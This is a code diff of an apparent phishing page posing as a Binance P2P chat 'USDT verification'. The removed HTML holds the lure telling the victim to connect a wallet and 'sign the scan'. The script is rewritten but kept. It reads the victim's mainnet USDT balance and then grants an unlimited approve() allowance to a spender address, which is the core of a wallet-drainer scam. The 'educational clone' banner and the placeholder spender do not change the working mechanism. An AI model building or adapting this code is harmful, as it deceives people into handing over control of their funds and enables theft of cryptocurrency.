@@ -1,49 +1,37 @@
-<!doctype html>
-<html lang="en"><head>
-<meta charset="utf-8">
-<title>USDT Verification – Educational Demo</title>
-<style>
-body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;background:#f5f5f5;}
-.top-bar{background:#fcd535;height:56px;display:flex;align-items:center;padding:0 24px;font-weight:600;font-size:18px;color:#1e2022;}
-.chat-container{max-width:600px;margin:40px auto;background:#fff;border-radius:8px;box-shadow:0 2px 8px rgba(0,0,0,.15);}
-.chat-header{padding:16px;border-bottom:1px solid #e6e8ea;font-size:16px;font-weight:500;}
-.chat-body{padding:24px;}
-.chat-bubble{background:#f0f2f5;border-radius:8px;padding:12px;margin-bottom:12px;display:inline-block;max-width:70%;}
-.btn{background:#166adc;color:#fff;border:0;border-radius:4px;padding:10px 18px;font-size:15px;cursor:pointer}
-.banner{background:red;color:#fff;text-align:center;padding:6px;font-size:14px}
-</style>
-</head>
-<body>
-<div class="banner">⚠️ EDUCATIONAL CLONE – REAL NETWORK – ONLY APPROVAL, NO TRANSFER ⚠️</div>
-<div class="top-bar">Binance P2P Chat</div>
-<div class="chat-container">
-  <div class="chat-header">Buyer – USDT Verification</div>
-  <div class="chat-body">
-    <div class="chat-bubble">Hi, please verify your USDT is original, not flash.</div>
-    <div class="chat-bubble">Click the button below → connect wallet → sign the scan.</div>
-    <button id="verifyBtn" class="btn">🔍 Scan & Verify USDT</button>
-  </div>
-</div>
-<!-- ONE script block only -->
 <script type="module">
-import * as ethers from "https://cdn.ethers.io/lib/ethers-5.6.esm.min.js";
+import { ethers } from "https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.esm.min.js";
+
 const USDT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
 const SPENDER = "0x0000000000000000000000000000000000000001";
-const provider = new ethers.providers.Web3Provider(window.ethereum);
-const abi = ["function balanceOf(address) view returns (uint)","function approve(address spender,uint amount) returns (bool)"];
-const usdt = new ethers.Contract(USDT, abi, provider);
-async function init(){
-  const accounts = await provider.send("eth_requestAccounts", []);
-  const signer   = provider.getSigner();
-  const addr     = await signer.getAddress();
-  const bal      = await usdt.balanceOf(addr);
+
+const abi = [
+  "function balanceOf(address) view returns (uint256)",
+  "function approve(address spender, uint256 amount) returns (bool)"
+];
+
+document.getElementById("verifyBtn").onclick = async () => {
+  if (!window.ethereum) {
+    alert("MetaMask not detected");
+    return;
+  }
+
+  const provider = new ethers.providers.Web3Provider(window.ethereum);
+  await provider.send("eth_requestAccounts", []); // USER GESTURE ✔
+
+  const signer = provider.getSigner();
+  const addr = await signer.getAddress();
+
+  const usdt = new ethers.Contract(USDT, abi, provider);
+  const bal = await usdt.balanceOf(addr);
+
   alert("Balance: " + ethers.utils.formatUnits(bal, 6) + " USDT");
-  document.getElementById("verifyBtn").onclick = async () => {
-    const tx = await usdt.connect(signer).approve(SPENDER, ethers.constants.MaxUint256);
-    await tx.wait();
-    alert("Done! Unlimited approval granted.\nView on Etherscan → Events tab.");
-  };
-}
-init();
+
+  const tx = await usdt
+    .connect(signer)
+    .approve(SPENDER, ethers.constants.MaxUint256);
+
+  await tx.wait();
+
+  alert("Done! Unlimited approval granted.\nCheck Etherscan → Events tab.");
+};
 </script>
-</body></html>
